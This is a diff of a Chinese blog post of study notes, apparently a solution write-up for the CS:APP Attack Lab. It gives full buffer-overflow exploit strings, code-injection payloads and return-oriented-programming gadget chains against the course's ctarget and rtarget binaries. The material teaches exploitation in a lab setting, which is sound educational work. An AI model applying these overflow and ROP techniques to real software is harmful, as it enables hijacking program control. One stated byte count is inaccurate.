@@ -9,13 +9,44 @@ tags:
 	- 学习笔记
 ---
 
-本次 Lab 是通过利用缓冲区溢出等漏洞来改变代码的行为。
+本次 Lab 是通过利用缓冲区溢出等漏洞来改变代码的行为。攻击的方式有将机器码写入栈中、利用已有汇编代码通过 `ret` 跳转来依次执行所需汇编代码等。
 
-## touch1
+## phase 1
 
 touch1 不需要写汇编代码，只要利用一定长度的字符串修改函数的返回地址即可。
 
+首先是 `test`，它会调用 `getbuf` 函数处理用户输入：
+
+```c
+void test() {
+    int val;
+    val = getbuf();
+    printf("NO explit. Getbuf returned 0x%x\n", val);
+}
+```
+
 <!-- more -->
+
+`getbuf` 的代码如下：
+
+```c
+unsigned getbuf() {
+    char buf[BUFFER_SIZE];
+    Gets(buf);
+    return 1;
+}
+```
+
+正常情况下调用完 `getbuf()` 后会返回 `test` 继续执行剩下的部分，但是我们要利用 `getbuf` 中的缓冲区漏洞，使其运行 `touch1`。
+
+``` c
+void touch1() {
+    vlevel = 1;
+    printf("Touch!: You called touch1()\n");
+    validate(1);
+    exit(0);
+}
+```
 
 先来看一下相关函数的汇编代码：
 
@@ -41,7 +72,7 @@ Dump of assembler code for function touch1:
 End of assembler dump.
 ```
 
-本来运行完 `getbuf` 函数后函数会返回 `test` 继续运行，但是我们可以通过为 `Gets` 函数提供过长的字符串，以覆盖原来的返回地址。
+正常情况下运行完 `getbuf` 函数后会返回 `test` 继续运行的，但是我们可以通过为 `Gets` 函数提供过长的字符串，以覆盖原来的返回地址。
 
 `getbuf` 函数首先申请了 `0x28 = 40` 字节的空间，假设此时 `$rsp = 0x100`，那么原本的函数返回地址应该在 `$rsp - 0x28` 处，占用 4 个字节。也就是说，如果我们提供 44 个字节长度的字符串，就能成功覆盖原本的函数返回地址。
 
@@ -58,10 +89,10 @@ End of assembler dump.
 00 00 00 00 
 00 00 00 00 
 00 00 00 00 
-c0 17 40 00 /* touch1 的入口地址 */
+c0 17 40 00 # touch1 的入口地址
 ```
 
-## touch2
+## phase 2
 
 这是 `touch2` 的源代码，想要正确运行 `touch2`，只覆盖返回地址已经无法完成要求了，因为它需要传入参数 `val`。
 
@@ -199,7 +230,7 @@ c3 00 00 00
 
 这里我们修改返回地址，这样下一条指令就会是栈顶处的攻击代码，从而完成进入 `touch2` 的准备，并进入 `touch2`。
 
-## touch3
+## phase 3
 
 `touch3` 相比更加麻烦了，因为它要求把 `cookie` 以字符串的形式传入，并调用 `hexmatch` 函数进入匹配。而 `hexmatch` 函数在匹配时会修改栈内的数据，这样我们就要小心选择位置来存放 `cookie`。
 
@@ -308,7 +339,7 @@ ret
 35 39 62 39  39 37 66 61                           # cookie
 ```
 
-## level 4
+## phase 4
 
 先使用 `objdump -d rtarget > rtarget.txt` 命令，方便查看机器码。
 
@@ -403,7 +434,7 @@ ret             # c3
 
 最终答案为：
 
-```
+```bash
 00 00 00 00  00 00 00 00  
 00 00 00 00  00 00 00 00 
 00 00 00 00  00 00 00 00 
@@ -413,5 +444,193 @@ cc 19 40 00  00 00 00 00 # gadget1
 fa 97 b9 59  00 00 00 00 # cookie
 c5 19 40 00  00 00 00 00 # gadget2
 ec 17 40 00  00 00 00 00 # touch2
+```
+
+## phase 5
+
+第 5 部分很复杂，而且只有 5 分，教授似乎是把它当成了一个 bonus，鼓励学有余力的同学去探索。
+
+先把 `rtarget` 反汇编：
+
+``` bash
+$ objdump -d rtarget > rtarget.txt
+```
+
+然后找到 `start_farm` 与 `end_farm` 之间的部分。那是有我们需要的 ROP 攻击代码。
+
+下面是我整理出来的可用于攻击的代码，入口地址可能会不一样，需要根据自己的情况作调整。（效果一致的代码被省略）
+
+```assembly
+# 1
+00000000004019a0 <addval_273>:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq
+
+# 2
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+# 3
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+
+# 4
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+
+# 5
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+
+# 6
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+  401a38:	c3                   	retq   
+
+# 7
+0000000000401a39 <addval_110>:
+  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
+  401a3f:	c3                   	retq   
+
+# 8
+0000000000401a40 <addval_487>:
+  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
+  401a46:	c3                   	retq   
+```
+
+整理过后，是这个样子：
+
+```assembly
+# 1
+0x4019a2    48 89 c7 movq %rax, %rdi
+            c3       retq
+# 2
+0x4019ab    58       popq %rax
+            90
+            c3       retq
+# 3         
+0x4019dc    5c       popq %rsp
+            89 c2
+            90
+            c3       retq
+# 4
+0x401a06    48 89 e0 movq %rsp, %rax
+            c3       retq
+            
+# 5
+0x401a13    89 ce    movl %ecx, %esi
+			90
+			90
+			c3       retq
+
+# 6
+0x401a34    89 d1    movl %edx, %ecx
+            38 c9
+            c3       retq
+            
+# 7
+0x401a3c    89 e0    movl %esp, %eax
+            c3       retq
+
+# 8
+0x401a42    89 c2    movl %eax, %edx
+            84 c0
+            c3       retq
+```
+
+简化版视图：
+
+```assembly
+# 1
+0x4019a2     movq %rax, %rdi
+# 2
+0x4019ab     popq %rax
+# 3         
+0x4019dc     popq %rsp
+# 4
+0x401a06     movq %rsp, %rax
+# 5
+0x401a13     movl %ecx, %esi
+# 6
+0x401a34     movl %edx, %ecx
+# 7
+0x401a3c     movl %esp, %eax
+# 8
+0x401a42     movl %eax, %edx
+```
+
+上面这些都是我在解题时找出的攻击代码，但是，只依靠这些是无法通过 `phase 5` 的。我们来看一下为什么。
+
+很明显，我们要把转换成 `ascii` 后的字符串写入栈中，在 `phase 3` 中就是这样做的。然后，确定字符串在栈中的地址。问题就在确定地址上。
+
+`ctarget` 中我们可以查看栈的状态，来确定存放地址，但在 `rtarget` 中，使用了栈随机化技术，同一行汇编代码在每次运行中也会有不一样的栈顶地址，所以这条路行不通。那么，我们只能利用字符串在栈中的相对位置来确定地址了。可是上面列出的几个语句并没有加法运算操作，那么怎么办呢？
+
+其实答案已经给我们了，再次回到 `farm`，看到这样一个函数：
+
+```assembly
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+```
+
+`lea` 是 load effective address 的简称，它只是简单地计算出地址，不会取出地址中存放的内容，经常会用作简单运算，就像这里，把 `$rdi + $rsi` 的结果赋给了 `%rax`。
+
+这样，我们就可以开始写攻击代码了 ，思路是：
+
+1. 获取栈顶地址
+2. 将此地址交给 `%rdi`
+3. 获取 `cookie` 字符串相对于栈顶的偏移 `offset`
+4. 将 `offset` 交给 `%rsi`
+5. 利用 `lea` 计算实际地址 `addr`
+6. 将 `addr` 交给 `%rdi`（一般用它传参，实际情况看汇编代码）
+7. 跳转到 `touch3`
+
+代码实现如下：
+
+```assembly
+# 汇编代码                                栈
+retq # 函数返回，进入攻击代码               | 0x401a06
+movq %rsp, %rax        # 4: 0x401a06
+retq # 得到了栈顶地址，就是右边      %rsp -> | 0x4019a2
+movq %rax, %rdi        # 1: 0x4019a2
+retq # 将栈顶地址交给 %rdi                 | 0x4019ab
+popq %rax              # 2: 0x4019ab     | offset = 0x48
+retq # 获取 offset                       | 0x401a42
+movl %eax, %edx        # 8: 0x401a42
+retq #                                   | 0x401a34
+movl %edx, %ecx        # 6: 0x401a34
+retq #                                   | 0x401a13
+movl %ecx, %esi        # 5: 0x401a13
+retq #                                   | 0x4019d6
+lea (%rdi, %rsi, 1), %rax
+retq # 计算实际地址 addr                   | 0x4019a2
+movq %rax, %rdi        # 1: 0x4019a2
+retq # 将 addr 交给 %rdi                  | 0x4018fa
+# touch3 here                            | cookie
+```
+
+按照上述程序，一行一行地执行，得到下列输入，即是答案：
+
+``` bash
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+00 00 00 00  00 00 00 00 
+06 1a 40 00  00 00 00 00 
+a2 19 40 00  00 00 00 00 
+ab 19 40 00  00 00 00 00 
+48 00 00 00  00 00 00 00 
+42 1a 40 00  00 00 00 00 
+34 1a 40 00  00 00 00 00 
+27 1a 40 00  00 00 00 00 
+d6 19 40 00  00 00 00 00 
+a2 19 40 00  00 00 00 00 
+fa 18 40 00  00 00 00 00 
+35 39 62 39  39 37 66 61
 ```
 
